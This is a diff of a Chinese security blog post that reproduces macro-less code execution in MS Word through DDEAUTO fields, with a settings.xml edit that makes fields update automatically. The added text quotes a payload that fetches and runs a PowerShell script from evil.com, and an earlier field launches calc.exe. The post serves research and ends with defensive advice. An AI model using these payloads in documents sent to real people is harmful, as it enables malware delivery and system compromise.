@@ -1,13 +1,12 @@
 ---
 title: MSWord Code Exec Without Macro
-date: 2017-10-12 22:54:29
+date: 2017-10-12 12:54:29
 tags: [vul,sec]
 categories: Security
 ---
-<script src="https://ob5vt1k7f.qnssl.com/pangu.js"></script>
 昨天复现了一个 Microsoft Office Word 的一个执行任意代码的姿势，跟之前爆出的两个CVE (CVE-2017-0199, CVE-2017-8759) 可以组成三板斧，这里简单记录一下
 
-在不启用宏的情况下执行任意程序，按照复现过程来看这确实像是一个功能而不是bug，微软也表示不会修复这个“漏洞”。这个功能的本意是为了更方便地在word里同步更新其它应用的内容，比如说在一个word文档里引用了另一个excel表格里的某项内容，通过连接域(Field)的方式可以实现在excel里更新内容后word中同步更新的效果，问题出在这个域的内容可以是一个公式(或者说表达式)，这个公式并不限制内容，于是我们可以这样，`ctrl+f9`插入一个域，在`{}`之间写入代码：
+在不启用宏的情况下执行任意程序，按照复现过程来看这确实像是一个功能而不是 bug，微软也表示不会修复这个“漏洞”。这个功能的本意是为了更方便地在 word 里同步更新其它应用的内容，比如说在一个 word文档里引用了另一个excel表格里的某项内容，通过连接域 (Field) 的方式可以实现在 excel 里更新内容后 word 中同步更新的效果，问题出在这个域的内容可以是一个公式(或者说表达式)，这个公式并不限制内容，于是我们可以这样，`ctrl+f9`插入一个域，在`{}`之间写入代码：
 
 `{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }`
 
@@ -44,6 +43,10 @@ categories: Security
 
 过程很简单，唯一不足的是打开文件过程中会有两次弹窗，第一次是询问是否更新链接，第二个是问是否执行程序，当两个都点击确认后才会执行。
 
+作者给出的命令是
+`{ DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://evil.com/evil.ps1');powershell -e $e "}`
+但是自己尝试了并没有成功，于是修改成上面的命令，测试成功，并且不会报毒
+
 除了上面使用的`DDEAUTO`，`DDE`也有能实现这个效果，但是要多一个步骤
 将文件后缀改为`zip`或`rar`，用`7z`打开，修改`word/settings.xml`文件，增加一行`<w:updateFields w:val="true"/>`
 ![](https://ob5vt1k7f.qnssl.com/6U0%25213Q8W%7BEOM%7BJ_V@7%29G7.png)
@@ -64,11 +67,11 @@ MERGEBARCODE
 ```
 参考微软文档 https://msdn.microsoft.com/en-us/library/ff529384(v=office.12).aspx
 
-目前不清楚这些方法有没有影响，微软认为并没有必要去修改这个“漏洞”
+目前不清楚这些方法有没有影响，微软认为并没有必要去修复这个“漏洞”
 
 > Microsoft responded that as suggested it is a feature and no further action will be taken, and will be considered for a next-version candidate bug.
 
-建议就是不要打开陌生的文档包括excel，ppt等，如有必要在保护视图中查看，另外及时更新系统补丁
+最近 office 漏洞频发，建议不要打开陌生的文档包括excel，ppt等，如有必要在保护视图中查看，另外及时更新系统补丁
 
 参考：
 https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
